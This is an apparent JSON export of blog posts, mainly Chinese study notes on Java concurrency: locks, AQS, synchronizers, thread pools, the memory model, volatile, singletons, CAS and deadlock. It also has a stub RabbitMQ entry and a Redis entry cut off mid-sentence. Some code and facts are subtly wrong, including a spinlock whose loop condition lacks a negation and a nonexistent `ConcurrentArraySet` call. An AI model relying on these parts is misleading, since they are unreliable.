{"posts":[{"title":"JUC(Java并发编程)","text":"八锁、线程池、ThreadLocal Synchronized和Lock区别语法层面 Synchronized是一个关键字，底层由C++编写 ；Lock是jdk的一个API Synchronized退出同步代码块自动释放锁；Lock需要手动unlock() 功能层面 都是悲观锁，都互斥，都是同步锁，都可重入 Lock可获取等待状态，公平，可打断 Lock有多种实现方式 ReentrantLock() ReentrantReadWriteLock()特性层面 在没竞争或者竞争小的情况下Synchronized昨儿很多优化，偏向锁、轻量锁…… 竞争激励的时候使用Lock Condition是 JDK1.5 之后才有的，它具有很好的灵活性，比如可以实现多路通知功能也就是在一个Lock对象中可以创建多个Condition实例（即对象监视器），线程对象可以注册在指定的Condition中，从而可以有选择性的进行线程通知，在调度线程上更加灵活。 在使用notify()/notifyAll()方法进行通知时，被通知的线程是由 JVM 选择的，用ReentrantLock类结合Condition实例可以实现“选择性通知” ，这个功能非常重要，而且是 Condition 接口默认提供的。而synchronized关键字就相当于整个 Lock 对象中只有一个Condition实例，所有的线程都注册在它一个身上。如果执行notifyAll()方法的话就会通知所有处于等待状态的线程这样会造成很大的效率问题，而Condition实例的signalAll()方法 只会唤醒注册在该Condition实例中的所有等待线程。 Synchronized升级无锁—偏向锁—轻量级锁—重量级锁 在实际的应用中，锁总是同一个线程持有，很少发生竞争，也就是说锁总是被第一个占用他的线程拥有，这个线程就是锁的偏向线程。 那么只需要锁在第一次被拥有的时候，记录下偏向线程的ID，这样偏向线程就一直持有锁（后续这个线程进入和退出这段同步锁的代码块时，不需要再次加锁和释放锁），而是直接会去检查锁的MARDWORD里面是否放的自己线程的ID。 如果相等，表示偏向锁是当前线程的，就不需要再次尝试获取锁，直到竞争发生才释放锁。以后每一次同步，检查所的偏向线程ID是否与当前线程ID一致，如果一致直接进入同步，无需每次加锁解锁都去CAS更新对象头。如果自始至终使用锁的线程只有一个，很明显偏向锁几乎没有额外开销，性能极高。 如果不等，表示发生了竞争，此时锁已经不是偏向于同一个线程了，这个时候会尝试使用CAS来替换MarkWord里面的线程ID为新线程ID（偏向锁只有遇到其他线程尝试竞争偏向锁的时候，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁的） 竞争成功，表示之前的线程不存在了，MardWord里面的线程ID为新的线程ID，锁不会升级，仍然为偏向锁； 竞争失败，这个时候可能需要升级为轻量级锁才可以保证线程间公平竞争锁 轻量级锁由偏向锁升级而来，当存在第二个线程竞争的时候偏向锁会升级为轻量级锁，竞争线程尝试CAS更新对象头失败，会等到全局安全点撤销偏向锁。偏向锁的撤销： 第一个线程需要在执行synchronized方法（处于代码块），他还没有执行完，其他线程来抢夺，该偏向锁就会被取消并出现锁升级，此时轻量级锁由原持有偏向锁的线程持有，继续执行代码块，而正在竞争的线程会进入自旋获得该轻量级锁。 第一个线程执行完成synchronized（退出同步块），则将对象头设置为无锁状态并撤销偏向锁，重新偏向。 重量级锁：基于进入退出Monitor管程对象进行的，编译时回有monitorenter和monitorexit指令实例方法上锁代码块上锁 ReentrantLock实现3线程交替打印12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/*** A执行完调用B B执行完调用C*/public class LockTicketABC { public static void main(String[] args) { Data3 data3 = new Data3(); new Thread(()-&gt;{ for(int i = 0; i &lt; 10; i++){ data3.printA(); } }).start(); new Thread(()-&gt;{ for(int i = 0; i &lt; 10; i++){ data3.printB(); } }).start();new Thread(()-&gt;{ for(int i = 0; i &lt; 10; i++){ data3.printC(); } }).start(); }}class Data3{ private int number = 1; Lock lock = new ReentrantLock(); Condition condition1 = lock.newCondition(); Condition condition2 = lock.newCondition(); Condition condition3 = lock.newCondition(); public void printA(){ lock.lock(); try { while (number != 1){ condition1.await(); } number = 2; System.out.println(Thread.currentThread().getName() + &quot;-&gt;AAAAA&quot;); condition2.signal(); } catch (Exception e) { e.printStackTrace(); } finally { lock.unlock(); } } public void printB(){ lock.lock(); try { while (number != 2){ condition2.await(); } number = 3; System.out.println(Thread.currentThread().getName() + &quot;-&gt;BBBBB&quot; ); condition3.signal(); } catch (Exception e) { e.printStackTrace(); } finally { lock.unlock(); } } public void printC(){ lock.lock(); try { while (number != 3){ condition3.await(); } number = 1; System.out.println(Thread.currentThread().getName() + &quot;-&gt;CCCCC&quot;); condition1.signal(); } catch (Exception e) { e.printStackTrace(); } finally { lock.unlock(); } }} 可重入锁同步代码块例子：从头到尾锁的都是object，外层已经获取锁了，中层内层也可以直接进入。对于ReentrantLock:注释掉内层的unlock后：仍然可以执行完程序，但是计数器没有清零，所以拿两个线程跑的时候就会出现阻塞现象。moniterexit计数器-1，只有减到0才会释放。 ArrayList的并发修改异常以及解决方法并发修改异常: 123List&lt;String&gt; list = new Vector(); //JDK1.0 古老的实现类 用的synchronized，效率低List&lt;String&gt; list = Collections.synchronizedList(new ArrayList()); List&lt;String&gt; list = new CopyOnWriteArrayList(); //用的lock锁 SynchronizedList无需改变List类的子类的数据结构，就可以将它们转换成线程安全的类，而Vector不能。SynchronizedList遍历时没有进行同步处理，Vector的遍历方法是线程安全的。SynchronizedList可以指定锁定的对象，Vector的锁定范围是方法。 Fail Fast与Fail Safe Fail Fast 一旦发现遍历时有人修改就抛出异常 对于ArrayList，底层源码有两个参数： mpdCount ： 遍历过程中list被修改的次数 except ：遍历开始前被修改的次数 不一致的话就报错 Fail Save CopyOnWriteArrayList就是采用这种方式 读的时候遍历旧数组 插入就先copy出来，加在copy的末尾再copy回去 HashSet安全方法12Set&lt;String&gt; set = Collections.synchronizedSet(new HashSet());Set&lt;String&gt; set = ConcurrentArraySet(new HashSet()); HashMap、ConcurrentHashMap、Hashtable CASCAS即CompareAndSwap，翻译成中文即比较并替换。Java中可以通过CAS操作来保证原子性，原子性 就是不可被中断的一些列操作或者一个操作，简单来说就是一系列操作，要么全部完成，要么失败，不 能被中断。 AQS AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制，这个机制 AQS 是用 CLH 队列锁实现的，即将暂时获取不到锁的线程加入到队列中。 CLH(Craig,Landin,and Hagersten)队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。 12345678910111213141516171819202122232425262728293031323334353637static final class Node { /** Marker to indicate a node is waiting in shared mode */ static final Node SHARED = new Node(); /** 排他锁的标识 */ static final Node EXCLUSIVE = null; /** waitStatus value to indicate thread has cancelled */ static final int CANCELLED = 1; /**0：默认值 -1：表示线程已经准备好了，就等释放资源了 -2：在等待队列中，等待condition唤醒 -3：共享式同步状态获取将会无条件地传播 */ static final int SIGNAL = -1; static final int CONDITION = -2; static final int PROPAGATE = -3; /** waitStatus Node对象储存表示的对象 */ volatile int waitStatus; /** 上一个节点 */ volatile Node prev; /** 下一个节点 */ volatile Node next; /** 当前Node绑定的线程 */ volatile Thread thread; Node nextWaiter; /** 返回前一个节点，如果为null就抛异常 */ final Node predecessor() throws NullPointerException { Node p = prev; if (p == null) throw new NullPointerException(); else return p; }} node节点里有个变量非常重要！waitStatus1：线程被取消0：默认值 1：表示线程已经准备好了，就等释放资源了 2：在等待队列中，等待condition唤醒 3：共享式同步状态获取将会无条件地传播 下面举例说明，以独占式的 ReentrantLock 为例， state 初始状态为0，表示未锁定状态。A线程进行 lock() 时，会调用 tryAcquire() 独占该锁并将 state+1 。此后，其他线程再调用 tryAcquire() 时 就会失败，直到A线程 unlock() 到state=0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A线程自己是可以重复获取此锁的（state会累加），这就是可重入的概念。但要注意，获取 多少次就要释放多么次，这样才能保证state是能回到零态的。 非公平锁 123456789final void lock() { //通过cas方式尝试将state从0改为1，返回true则代表修改成功 if (compareAndSetState(0, 1)) //属性设置为当前线程 setExclusiveOwnerThread(Thread.currentThread()); else //如下 acquire(1);} 1234567public final void acquire(int arg) { //再次尝试获取锁资源 if (!tryAcquire(arg) &amp;&amp; //失败的话追加在队列尾部 acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } 123protected boolean tryAcquire(int arg) { throw new UnsupportedOperationException();} 常用的辅助类（必会）CountDownLatch 减法计数器1234567891011public static void main(String[] args) throws InterruptedException { CountDownLatch countDownLatch = new CountDownLatch(6); for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { countDownLatch.countDown();//数量减一 System.out.println(Thread.currentThread().getName() + &quot; Go Out&quot;); },String.valueOf(i)).start(); } countDownLatch.await(); //这里指的是等到计数器归零以后才会往下执行操作 System.out.println(&quot;Close the door&quot;); } CyclicBarrier 加法计数器反应了等一组线程某个条件完成以后全部一起执行后续功能 123456789101112131415161718public static void main(String[] args) { CyclicBarrier cyclicBarrier = new CyclicBarrier(7,()-&gt;{ System.out.println(&quot;召唤神龙&quot;); }); for (int i = 1; i &lt;= 7; i++) { final int temp = i; new Thread(()-&gt;{ System.out.println(Thread.currentThread().getName() + &quot;收集&quot; + temp + &quot;颗龙珠&quot;); try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } }).start(); } } Semaphore 信号量6个车 三个停车位 轮流等待车位 作用：多个共享资源互斥的使用并发限流，控制最大线程数123456789101112131415161718public static void main(String[] args) { Semaphore semaphore = new Semaphore(3); //默认线程数 停车位个数 for (int i = 0; i &lt; 6; i++) { int temp = i; new Thread(()-&gt;{ try { semaphore.acquire();//得到，如果已经满了就等到释放为止 System.out.println(Thread.currentThread().getName() + &quot;车进来了&quot;); TimeUnit.SECONDS.sleep(2); System.out.println(Thread.currentThread().getName() + &quot;车离开了&quot;); } catch (InterruptedException e) { e.printStackTrace(); }finally { semaphore.release();//释放，会将当前的信号量释放 + 1，然后唤醒等待的线程 } }).start(); } } 打印结果123456789101112Thread-0车进来了Thread-2车进来了Thread-1车进来了Thread-1车离开了Thread-2车离开了Thread-0车离开了Thread-3车进来了Thread-5车进来了Thread-4车进来了Thread-3车离开了Thread-5车离开了Thread-4车离开了 阻塞队列阻塞 写入：如果队列满了，就必须阻塞等待 取出：如果队列是空的，必须阻塞等待生产 四组API 抛异常 有返回值,不抛出异常 阻塞等待 超时等待 添加 add offer put offer 移除 remove poll take poll 检测队列首 element peek / / ConcurrentHashMap1.7 1.8底层实现原理 线程池推荐使用 ThreadPoolExecutor 构造函数创建线程池在《阿里巴巴 Java 开发手册》“并发处理”这一章节，明确指出线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。使用线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源开销，解决资源不足的问题。如果不使用线程池，有可能会造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。另外，《阿里巴巴 Java 开发手册》中强制线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 构造函数的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险Executors 返回线程池对象的弊端如下(后文会详细介绍到)： FixedThreadPool 和 SingleThreadExecutor ： 允许请求的队列长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM。 CachedThreadPool 和 ScheduledThreadPool ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。 三大方法123ExecutorService threadPool = Executors.newSingleThreadExecutor();//单线程ExecutorService threadPool = Executors.newFixedThreadPool(5);//固定线程池大小ExecutorService threadPool = Executors.newCachedThreadPool();//可伸缩的，遇强则强，遇弱则弱 我们可以创建三种类型的 ThreadPoolExecutor： FixedThreadPool ： 该方法返回一个固定线程数量的线程池。该线程池中的线程数量始终不变。当有一个新的任务提交时，线程池中若有空闲线程，则立即执行。若没有，则新的任务会被暂存在一个任务队列中，待有线程空闲时，便处理在任务队列中的任务。 SingleThreadExecutor： 方法返回一个只有一个线程的线程池。若多余一个任务被提交到该线程池，任务会被保存在一个任务队列中，待线程空闲，按先入先出的顺序执行队列中的任务。 CachedThreadPool： 该方法返回一个可根据实际情况调整线程数量的线程池。线程池的线程数量不确定，但若有空闲线程可以复用，则会优先使用可复用的线程。若所有线程均在工作，又有新的任务提交，则会创建新的线程处理任务。所有线程在当前任务执行完毕后，将返回线程池进行复用。 ThreadPoolExecutor类分析 （七大参数）12345678910111213141516171819202122232425/** * 用给定的初始参数创建一个新的ThreadPoolExecutor。 */ public ThreadPoolExecutor(int corePoolSize,//线程池的核心线程数量 int maximumPoolSize,//线程池的最大线程数 long keepAliveTime,//当线程数大于核心线程数时，多余的空闲线程存活的最长时间 TimeUnit unit,//时间单位 BlockingQueue&lt;Runnable&gt; workQueue,//任务队列，用来储存等待执行任务的队列 ThreadFactory threadFactory,//线程工厂，用来创建线程，一般默认即可 RejectedExecutionHandler handler//拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务 ) { if (corePoolSize &lt; 0 || maximumPoolSize &lt;= 0 || maximumPoolSize &lt; corePoolSize || keepAliveTime &lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } ThreadPoolExecutor 3 个最重要的参数： corePoolSize : 核心线程数线程数定义了最小可以同时运行的线程数量。 maximumPoolSize : 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。 workQueue: 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。 ThreadPoolExecutor其他常见参数 : keepAliveTime:当线程池中的线程数量大于 corePoolSize 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 keepAliveTime才会被回收销毁； unit : keepAliveTime 参数的时间单位。 threadFactory :executor 创建新线程的时候会用到。 handler :饱和策略。关于饱和策略下面单独介绍一下。 四种拒绝策略(饱和策略) CallerRunsPolicy:由调用线程处理该任务 AbortPolicy:丢弃任务 并抛出RejectedExecutionException异常 【 默认 】 DiscardPolicy:丢弃任务，但是不抛出异常 DiscardOldestPolicy:丢弃队列最前面的任务（被poll()出去），然后重新尝试执行任务 阻塞队列 ArrayBlockingQueue、 LinkedBlockingQueue、 SynchronousQueue、 PriorityBlockQueue。ArrayBlockingQueue是一个基于数组结构的有界阻塞队列，此队列按 FIFO（先进先出）原则对元素进行排序 ArrayBlockingQueue 是一个用数组实现的有界阻塞队列。 队列慢时插入操作被阻塞，队列空时，移除操作被阻塞。 按照先进先出（FIFO）原则对元素进行排序。 默认不保证线程公平的访问队列。 公平访问队列：按照阻塞的先后顺序访问队列，即先阻塞的线程先访问队列。 非公平性是对先等待的线程是非公平的，当队列可用时，阻塞的线程都可以争夺访问队列的资格。有可能先阻塞的线程最后才访问访问队列。 公平性会降低吞吐量。 LinkedBlockingQueue一个基于链表结构的阻塞队列，此队列按 FIFO 排序元素，吞吐量通常要高于 ArrayBlockingQueue。静态工厂方法 Executors.newFixedThreadPool () 使用了这个队列。（newFixedThreadPool 用于创建固定线程数） LinkedBlockingQueue 具有单链表和有界阻塞队列的功能。 队列慢时插入操作被阻塞，队列空时，移除操作被阻塞。 默认和最大长度为 Integer.MAX_VALUE，相当于无界 (值非常大：2^31-1)。 SynchronousQueue一个不存储元素的阻塞队列。每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，吞吐量通常要高于 LinkedBlockingQueue，静态工厂方法 Executors.newCachedThreadPool 使用这个队列。（newCachedThreadPool 用于根据需要创建新线程） 我称 SynchronousQueue 为” 传球好手 “。想象一下这个场景：小明抱着一个篮球想传给小花，如果小花没有将球拿走，则小明是不能再拿其他球的。 SynchronousQueue 负责把生产者产生的数据传递给消费者线程。 SynchronousQueue 本身不存储数据，调用了 put 方法后，队列里面也是空的。 每一个 put 操作必须等待一个 take 操作完成，否则不能添加元素。 适合传递性场景。 性能高于 ArrayBlockingQueue 和 LinkedBlockingQueue。 PriorityBlockingQueue一个具有优先级的无限阻塞队列。 PriorityBlockQueue = PriorityQueue + BlockingQueue 之前我们也讲到了 PriorityQueue 的原理，支持对元素排序。 元素默认自然排序。 可以自定义 CompareTo () 方法来指定元素排序规则。 可以通过构造函数构造参数 Comparator 来对元素进行排序。 最大线程到底如何确定（调优） CPU密集型，几核就是几，可以保持CPU的效率最高 1Runtime.getRuntime().availableProcessors();//获取电脑的CPU核数，运维电脑和本地不一样 这种任务消耗的主要是 CPU 资源，可以将线程数设置为 N（CPU 核心数）+1，比 CPU 核心数多出来的一个线程是为了防止线程偶发的缺页中断，或者其它原因导致的任务暂停而带来的影响。一旦任务暂停，CPU 就会处于空闲状态，而在这种情况下多出来的一个线程就可以充分利用 CPU 的空闲时间。 IO密集型，判断程序中十分消耗IO的线程，大于这个数就行，一般设置为2倍 这种任务应用起来，系统会用大部分的时间来处理 I/O 交互，而线程在处理 I/O 的时间段内不会占用 CPU 来处理，这时就可以将 CPU 交出给其它线程使用。因此在 I/O 密集型任务的应用中，我们可以多配置一些线程，具体的计算方法是 2N。 JMM模型（Java内存模型）为了屏蔽系统之间的差异Java 内存模型抽象了线程和主内存之间的关系，就比如说线程之间的共享变量必须存储在主内存中。Java 内存模型主要目的是为了屏蔽系统和硬件的差异，避免一套代码在不同的平台下产生的效果不一致。在 JDK1.2 之前，Java 的内存模型实现总是从主存（即共享内存）读取变量，是不需要进行特别的注意的。而在当前的 Java 内存模型下，线程可以把变量保存本地内存（比如机器的寄存器）中，而不是直接在主存中进行读写。这就可能造成一个线程在主存中修改了一个变量的值，而另外一个线程还继续使用它在寄存器中的变量值的拷贝，造成数据的不一致。 lock(锁定):作用于主内存的变量，它把一个变量标识为一条线程独占的状态。 unlock(解锁):作用于主内存的变量，它把一个处于锁定状态的变量释放出来，释放后的变量 才可以被其他线程锁定。 read(读取):作用于主内存的变量，它把一个变量的值从主内存传输到线程的工作内存中，以 便随后的load动作使用。 load(载入):作用于工作内存的变量，它把read操作从主内存中得到的变量值放入工作内存的 变量副本中。 use(使用):作用于工作内存的变量，它把工作内存中一个变量的值传递给执行引擎，每当虚 拟机遇到一个需要使用变量的值的字节码指令时将会执行这个操作。 assign(赋值):作用于工作内存的变量，它把一个从执行引擎接收的值赋给工作内存的变量， 每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作 store(存储):作用于工作内存的变量，它把工作内存中一个变量的值传送到主内存中，以便随 后的write操作使用。 write(写入):作用于主内存的变量，它把store操作从工作内存中得到的变量的值放入主内存的 变量中。 不允许read和load、store和write操作之一单独出现，即不允许一个变量从主内存读取了但工作内 存不接受，或者工作内存发起回写了但主内存不接受的情况出现。 不允许一个线程丢弃它最近的assign操作，即变量在工作内存中改变了之后必须把该变化同步回 主内存。 不允许一个线程无原因地(没有发生过任何assign操作)把数据从线程的工作内存同步回主内存 中。 一个新的变量只能在主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化(load或 a s s i gn ) 的 变 量 ， 换 句 话 说 就 是 对 一 个 变 量 实 施 u s e 、 s t o r e 操 作 之 前 ， 必 须 先 执 行 a s s i gn 和 l o a d 操 作 。 一个变量在同一个时刻只允许一条线程对其进行lock操作，但lock操作可以被同一条线程重复执 行多次，多次执行lock后，只有执行相同次数的unlock操作，变量才会被解锁。 如果对一个变量执行lock操作，那将会清空工作内存中此变量的值，在执行引擎使用这个变量 前，需要重新执行load或assign操作以初始化变量的值。 如果一个变量事先没有被lock操作锁定，那就不允许对它执行unlock操作，也不允许去unlock一个 被其他线程锁定的变量。 对一个变量执行unlock操作之前，必须先把此变量同步回主内存中(执行store、write操作)。 Volatilevolatile 关键字防止 JVM 的指令重排 ，保证变量的可见性，内存屏障保证有序性，但volatile不保证原子性什么是指令重排：你写的程序，计算机并不是按照你写的那样去执行的源代码–&gt; 编译器的优化重排–&gt; 指令运行也可能会重排–&gt; 内存系统也会重排–&gt;执行处理器在进行指令重排的时候，考虑：数据之间依赖性问题 1234567int x = 1;int x = 2;x = x + 5;y = x * x;//我们希望：1234//但可能是：2134 1324//可不可能：4123？ 不可能 可能造成的结果： a b x y 都是0 线程A 线程B x = a y = b b = 1 a = 2 正常的结果：x = 0； y = 0; 线程A 线程B b = 1 a = 2 x = a y = b 诡异的结果：x = 2; y = 1;volatile可以避免指令重排：cpu中内存屏障作用： 保证特定的操作执行顺序 可以保证某些变量的内存可见性（利用这些特性 volatile实现了可见性） 单例模式单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。注意： 1、单例类只能有一个实例。 2、单例类必须自己创建自己的唯一实例。 3、单例类必须给所有其他对象提供这一实例。饿汉式12345678public class Hungry { private Hungry(){} private final static Hungry hungry = new Hungry(); public static Hungry getInstance(){ return hungry; }} 懒汉式（线程不安全）12345678910public class Lazy { private Lazy(){} private static Lazy lazy; public static Lazy getInstance(){ if(lazy == null) { lazy = new Lazy(); } return lazy; }} 懒汉式：双检锁/双重校验锁（DCL，即double-checked locking）这里双重检测加锁是保证了操作原子性，只有一个线程能创建一个实例，其他线程无法创建第二个。volatile关键字是为了防止因为指令重排导致的多线程问题，有可能线程A创建一个实例，虚拟机只执行了分配空间，对象地址引用这两步，这是线程B过来发现对象已经被创建了，但是获取到的对象是还没有被初始化的。12345678910111213141516171819202122232425public class Lazy { private Lazy(){} private volatile static Lazy lazy; //双重检测锁模式 懒汉式单例 DCL懒汉式 public static Lazy getInstance(){ if(lazy == null){ synchronized (Lazy.class){ if(lazy == null) { lazy = new Lazy();//不是一个原子性操作 /** * 1.分配内存空间 * 2.执行构造方法（初始化对象） * 3.对象指向空间 * * 指令重排 132 * A线程没问题，B指向空间发现不为null，直接return 但是此时lazy还没有完成构造 因此需要用volatile */ } } } return lazy; }} 登记式/静态内部类123456789public class Lazy { private static class SingletonHolder { private static final Lazy INSTANCE = new Lazy(); } private Lazy (){} public static final Lazy getInstance() { return SingletonHolder.INSTANCE; } } Atomic 原子类CAS ：比较当前工作内存中的值和主内存的值，如果是期望的，就操作，否则就一直操作。缺点： 自旋锁，会耗时 一次性只能保证一个共享变量的原子性 ABA问题12345678910public class CompareAndSetTest { public static void main(String[] args) { AtomicInteger atomicInteger = new AtomicInteger(2020); // 如果是期望的值2020，则更新为2021，否则不更新 atomicInteger.compareAndSet(2020,2021); atomicInteger.getAndIncrement(); //+1 System.out.println(atomicInteger.get()); //2022 }} 底层是一个自旋锁 AtomicBoolean: 原子更新布尔类型。 AtomicInteger: 原子更新整型。 AtomicLong: 原子更新长整型。 AtomicReference: 原子更新引用类型。 AtomicReferenceFieldUpdater: 原子更新引用类型的字段。 AtomicMarkableReferce: 原子更新带有标记位的引用类型，可以使用构造方法更新一个布尔类型的标记位和引用类型。 AtomicIntegerFieldUpdater: 原子更新整型的字段的更新器。 AtomicLongFieldUpdater: 原子更新长整型字段的更新器。 AtomicStampedFieldUpdater: 原子更新带有版本号的引用类型。 各种锁的理解公平锁、非公平锁公平锁：非常公平，不能够插队，必须先来后到非公平所：非常不公平，可以插队（默认都是非公平） 1234567/** * Creates an instance of {@code ReentrantLock}. * This is equivalent to using {@code ReentrantLock(false)}. */public ReentrantLock() { sync = new NonfairSync();} 可重入锁（递归锁） synchronized锁 Lock锁 自旋锁CAS之前AtomicInteger里又提到过： 123456789public final int getAndAddInt(Object var1, long var2, int var4) { int var5; //这里的do while就是自旋锁 do { var5 = this.getIntVolatile(var1, var2); } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;} 自己写一个自旋锁12345678910111213141516171819class Spinlock { AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;&gt;(); public void myLock() { Thread thread = Thread.currentThread(); System.out.println(Thread.currentThread().getName() + &quot;MyLock&quot;); //自旋锁 while (atomicReference.compareAndSet(null, thread)) { } } //解锁 public void myUnLock() { Thread thread = Thread.currentThread(); System.out.println(Thread.currentThread().getName() + &quot;MyUnLock&quot;); atomicReference.compareAndSet(thread, null); }} 死锁 多个线程同时被阻塞，它们中的一个或者全部都在等待某个资源被释放。由于线程被无限期地阻塞，因此程序不可能正常终止。 123456789101112131415161718192021222324252627282930313233343536public class DeadLockDemo { private static Object resource1 = new Object();//资源 1 private static Object resource2 = new Object();//资源 2 public static void main(String[] args) { new Thread(() -&gt; { synchronized (resource1) { System.out.println(Thread.currentThread() + &quot;get resource1&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + &quot;waiting get resource2&quot;); synchronized (resource2) { System.out.println(Thread.currentThread() + &quot;get resource2&quot;); } } }, &quot;线程 1&quot;).start(); new Thread(() -&gt; { synchronized (resource2) { System.out.println(Thread.currentThread() + &quot;get resource2&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread() + &quot;waiting get resource1&quot;); synchronized (resource1) { System.out.println(Thread.currentThread() + &quot;get resource1&quot;); } } }, &quot;线程 2&quot;).start(); }} 输出： 1234Thread[线程 1,5,main]get resource1Thread[线程 2,5,main]get resource2Thread[线程 1,5,main]waiting get resource2Thread[线程 2,5,main]waiting get resource1 死锁的四个必要条件 互斥条件：一段时间内某个资源只能由一个线程占用 请求和保持条件：线程至少保持了一个资源，但又提出了新的资源要求，该新资源被其他线程占有，此时请求阻塞，但又对自己持有的资源不放 不剥夺条件：线程获得的资源在未释放以前不能被其他线程剥夺占有 环路等待条件：发生死锁时，必然存在一个线程资源环形链，A等B，B等C，C等A。 ThreadLocal 线程并发：在多线程并发场景下 传递数据：可以通过ThreadLocal在同一线程不同组件中传递公共变量 线程隔离：每个线程变量都是独立的，不会相互影响 JDK8优点： 每个Map存储的Entry变少（避免hash冲突） Thread销毁的时候，ThreadLocalMap也会随之销毁，减少内存的使用 重要方法声明： 方法声明 描述 protected T initialValue() 返回当前线程局部变量的初始值 public T get() 设置当前线程绑定的局部变量 public void set(T value) 获取当前线程绑定的局部变量 public void remove() 移除当前线程绑定的局部变量 ThreadLocal中ThreadLocalMap数据结构和关系 ThreadLocal的key是弱引用，为什么 如何保证线程的顺序执行1234567891011121314151617public class FIFOThreadExample { public static void foo(String name) { System.out.print(name); } public static void main(String[] args) throws InterruptedException{ Thread thread1 = new Thread(() -&gt; foo(&quot;A&quot;)); Thread thread2 = new Thread(() -&gt; foo(&quot;B&quot;)); Thread thread3 = new Thread(() -&gt; foo(&quot;C&quot;)); thread1.start(); thread1.join(); thread2.start(); thread2.join(); thread3.start(); }} 12345678910111213141516171819import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class FIFOThreadExample { public static void foo(String name) { System.out.print(name); } public static void main(String[] args) throws InterruptedException{ Thread thread1 = new Thread(() -&gt; foo(&quot;A&quot;)); Thread thread2 = new Thread(() -&gt; foo(&quot;B&quot;)); Thread thread3 = new Thread(() -&gt; foo(&quot;C&quot;)); ExecutorService executor = Executors.newSingleThreadExecutor(); executor.submit(thread1); executor.submit(thread2); executor.submit(thread3); executor.shutdown(); }} 12345678910111213141516171819202122232425262728293031323334353637public class TicketExample2 { //信号量 static volatile int ticket = 1; //线程休眠时间 public final static int SLEEP_TIME = 1; public static void foo(int name){ //因为线程的执行顺序是不可预期的，因此需要每个线程自旋 while (true) { if (ticket == name) { try { Thread.sleep(SLEEP_TIME); //每个线程循环打印3次 for (int i = 0; i &lt; 3; i++) { System.out.println(name + &quot; &quot; + i); } } catch (InterruptedException e) { e.printStackTrace(); } //信号量变更 ticket = name%3+1; return; } } } public static void main(String[] args) throws InterruptedException { Thread thread1 = new Thread(() -&gt; foo(1)); Thread thread2 = new Thread(() -&gt; foo(2)); Thread thread3 = new Thread(() -&gt; foo(3)); thread1.start(); thread2.start(); thread3.start(); }} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class TicketExample3 { //信号量 AtomicInteger ticket = new AtomicInteger(1); public Lock lock = new ReentrantLock(); private Condition condition1 = lock.newCondition(); private Condition condition2 = lock.newCondition(); private Condition condition3 = lock.newCondition(); private Condition[] conditions = {condition1, condition2, condition3}; public void foo(int name) { try { lock.lock(); //因为线程的执行顺序是不可预期的，因此需要每个线程自旋 System.out.println(&quot;线程&quot; + name + &quot; 开始执行&quot;); if(ticket.get() != name) { try { System.out.println(&quot;当前标识位为&quot; + ticket.get() + &quot;,线程&quot; + name + &quot; 开始等待&quot;); //开始等待被唤醒 conditions[name - 1].await(); System.out.println(&quot;线程&quot; + name + &quot; 被唤醒&quot;); } catch (InterruptedException e) { e.printStackTrace(); } } System.out.println(name); ticket.getAndIncrement(); if (ticket.get() &gt; 3) { ticket.set(1); } //执行完毕，唤醒下一次。1唤醒2,2唤醒3 conditions[name % 3].signal(); } finally { //一定要释放锁 lock.unlock(); } } public static void main(String[] args) throws InterruptedException { TicketExample3 example = new TicketExample3(); Thread t1 = new Thread(() -&gt; { example.foo(1); }); Thread t2 = new Thread(() -&gt; { example.foo(2); }); Thread t3 = new Thread(() -&gt; { example.foo(3); }); t1.start(); t2.start(); t3.start(); }}","link":"/2022/05/22/JUC(JAVA%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B)/"},{"title":"RabbitMQ","text":"RabbitMQ相关内容","link":"/2022/05/25/MQ/"},{"title":"Redis","text":"Redis数据类型、三种模式、淘汰策略 5种数据类型Redis 在互联网产品中使用的场景实在是太多太多，这里分别对 Redis 